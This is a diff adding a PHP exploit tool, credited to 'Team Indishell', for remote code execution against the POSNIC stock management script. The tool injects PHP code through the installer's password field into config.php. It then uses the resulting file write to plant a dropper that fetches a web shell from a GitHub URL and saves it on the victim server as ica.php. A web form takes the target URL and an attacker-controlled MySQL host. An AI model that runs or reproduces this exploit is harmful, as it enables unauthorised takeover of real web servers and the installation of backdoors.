@@ -1,0 +1,242 @@
+<?php
+$head = '
+<html>
+<head>
+<link href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTLfLXmLeMSTt0jOXREfgvdp8IYWnE9_t49PpAiJNvwHTqnKkL4" rel="icon" type="image/x-icon"/>
+</script>
+<title>--==[[IndiSh3LL]]==--</title>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<STYLE>
+body {
+font-family: Tahoma;
+color: white;
+background: #444444;
+}
+
+input {
+border			: solid 2px ;
+border-color		: black;
+BACKGROUND-COLOR: #444444;
+font: 8pt Verdana;
+
+color: white;
+}
+
+submit {
+BORDER:  buttonhighlight 2px outset;
+BACKGROUND-COLOR: Black;
+width: 30%;
+color: #FFF;
+}
+
+#t input[type=\'submit\']{
+	COLOR: White;
+	border:none;
+	BACKGROUND-COLOR: black;
+}
+
+#t input[type=\'submit\']:hover {
+	
+	BACKGROUND-COLOR: #ff9933;
+	color: black;
+	
+}
+tr {
+BORDER: dashed 1px #333;
+color: #FFF;
+}
+td {
+BORDER: dashed 0px ;
+}
+.table1 {
+BORDER: 0px Black;
+BACKGROUND-COLOR: Black;
+color: #FFF;
+}
+.td1 {
+BORDER: 0px;
+BORDER-COLOR: #333333;
+font: 7pt Verdana;
+color: Green;
+}
+.tr1 {
+BORDER: 0px;
+BORDER-COLOR: #333333;
+color: #FFF;
+}
+table {
+BORDER: dashed 2px #333;
+BORDER-COLOR: #333333;
+BACKGROUND-COLOR: #191919;;
+color: #FFF;
+}
+textarea {
+border			: dashed 2px #333;
+BACKGROUND-COLOR: Black;
+font: Fixedsys bold;
+color: #999;
+}
+A:link {
+border: 1px;
+	COLOR: red; TEXT-DECORATION: none
+}
+A:visited {
+	COLOR: red; TEXT-DECORATION: none
+}
+A:hover {
+	color: White; TEXT-DECORATION: none
+}
+A:active {
+	color: white; TEXT-DECORATION: none
+}
+</STYLE>
+'; 
+
+
+
+		echo $head ;
+		echo '
+
+<table width="100%" cellspacing="0" cellpadding="0" class="tb1" >
+
+			
+
+       <td width="100%" align=center valign="top" rowspan="1">
+           <font color=#ff9933 size=5 face="comic sans ms"><b>--==[[ POSNIC, PHP stock </font><font color=white size=5 face="comic sans ms"><b>management script Remote code </font><font color=green size=5 face="comic sans ms"><b>execution exploiter ]==--</font><br><font color=white size=5 face="comic sans ms">--==[[ With Love from Team  Indishell]]==--</br></font> <div class="hedr"> 
+
+        <td height="10" align="left" class="td1"></td></tr><tr><td 
+        width="100%" align="center" valign="top" rowspan="1"><font 
+        color="red" face="comic sans ms"size="1"><b> 
+        <font color=#ff9933> 
+        ##########################################</font><font color=white>#############################################</font><font color=green>#############################################</font><br><font color=white>
+        --==[[Greetz to]]==--</font><br> <font color=#ff9933>Guru ji zero ,code breaker ica, root_devil, google_warrior,INX_r0ot,Darkwolf indishell,Baba ,Silent poison India,Magnum sniper,ethicalnoob Indishell,Local root indishell,Irfninja indishell<br>Reborn India,L0rd Crus4d3r,cool toad,Hackuin,Alicks,Gujjar PCP,Bikash,Dinelson Amine,Th3 D3str0yer,SKSking,rad paul,Godzila,mike waals,zoo zoo,cyber warrior,Neo hacker ICA<br>cyber gladiator,7he Cre4t0r,Cyber Ace, Golden boy INDIA,Ketan Singh,Yash,Aneesh Dogra,AR AR,saad abbasi,hero,Minhal Mehdi ,Raj bhai ji , Hacking queen ,lovetherisk and rest of TEAM INDISHELL<br>
+<font color=white>--==[[Love to]]==--</font><br># My Father ,my Ex Teacher,cold fire hacker,Mannu, ViKi ,Ashu bhai ji,Soldier Of God, Bhuppi,Gujjar PCP,
+Mohit,Ffe,Ashish,Shardhanand,Budhaoo,Jagriti,Salty, Hacker fantastic, Jennifer Arcuri and Don(Deepika kaushik)<br>
+<font color=white>--==[[Interface Desgined By]]==--</font><br><font color=red>GCE College ke DON :D</font>        <br></font>
+        <b> 
+        <font color=#ff9933> 
+        ##########################################</font><font color=white>#############################################</font><font color=green>#############################################</font>
+						
+           </table>
+       </table> 
+
+'; 
+
+echo '<div align=center>
+<font size=4 color=white face="comic sans ms"><img src="https://web.archive.org/web/20160206014924/http://www.freesmileys.org/smileys/smiley-cool21.gif"> --==[[ code for India,Hack for India,Die for India ]]==-- <img src="https://web.archive.org/web/20160206014924/http://www.freesmileys.org/smileys/smiley-flag010.gif"></font>
+<br>Please <a href="https://github.com/incredibleindishell/exploit-code-by-me/tree/master/POSNIC">Read it</a> before using this code.<br><br>
+<form method=post>
+						target URL: -<input type=text name=tar>
+						<br><br>Attacker controled Remote MySQL host: - <input type=text name=mhost value="attacker_controlled MYSQL server IP">
+						<br><br>Attacker controled Remote MySQL account username: - <input type=text name=muser>
+						<br><br>
+						<input type=submit name=launch value="Chal Billu, own the shit 8-)">
+						</form>';
+
+
+
+function request($lu,$payload)
+				{
+				$ch = curl_init();
+				curl_setopt($ch, CURLOPT_URL, $lu);
+				curl_setopt($ch, CURLOPT_HEADER, 0);
+				curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+				curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
+				curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+				curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8');
+				curl_setopt ($ch, CURLOPT_POST, 1);
+				curl_setopt ($ch, CURLOPT_POSTFIELDS, "$payload");
+				curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
+				curl_exec ($ch);
+				curl_close ($ch);
+				}
+	
+function shell_check($url) {
+									$curl = curl_init($url);
+									curl_setopt($curl, CURLOPT_NOBODY, true);
+									$result = curl_exec($curl);
+									$ret = false;
+									if ($result !== false) {
+															$statusCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
+															if ($statusCode == 200) {
+																					$ret = true;
+																					}
+															}
+									curl_close($curl);
+									return $ret;
+									}	
+				
+
+function access($lu)
+{
+	$ch = curl_init();
+
+curl_setopt($ch, CURLOPT_URL, $lu);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8');
+$result['EXE'] = curl_exec($ch);
+curl_close($ch);
+return $result['EXE'];
+	
+}	
+	
+
+if(isset($_POST['launch']))
+{
+	
+	$tar=$_POST['tar'];
+	$mhost=trim($_POST['mhost']);
+	$muser=trim($_POST['muser']);
+	
+
+	$injecturl=$tar.'/setup_page.php';
+	$exploiturl=$tar.'/config.php';
+	
+	
+	
+/////////////////////////////////////
+//here, we are injecting config file
+/////////////////////////////////////
+	$hex_it="select[]=1&select_box=owned&host=$mhost&username=$muser&password=\";file_put_contents(\$_POST[2],\$_POST[3]);//&dummy=1&submit=INSTALL";
+	request($injecturl,$hex_it);
+	
+/////////////////////////////////////////
+///Her we go, let's dump shell on server	
+////////////////////////////////////////
+	$code='<?php 
+			 function access($lu)
+								{
+								
+								$ch = curl_init();
+								curl_setopt($ch, CURLOPT_URL, $lu);
+								curl_setopt($ch, CURLOPT_HEADER, 0);
+								curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+								curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
+								curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+								curl_setopt($ch, CURLOPT_USERAGENT, \'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8\');
+								$result[\'EXE\'] = curl_exec($ch);
+								curl_close($ch);
+								return $result[\'EXE\'];
+									
+								}
+								$shell=access("https://raw.githubusercontent.com/incredibleindishell/Mannu-Shell/master/mannu.php");
+								file_put_contents("ica.php",$shell);
+								
+			?>';
+	$post_request='2=mannu.php&3='.$code;
+	request($exploiturl,$post_request);
+	access($tar.'/mannu.php');
+	$shell_link=shell_check($tar.'/ica.php');
+	if($shell_link==True)
+	{
+	echo 'check your shell at <a href="'.$tar.'/ica.php">This link </a>';
+	}
+	
+}
+
+
+?>
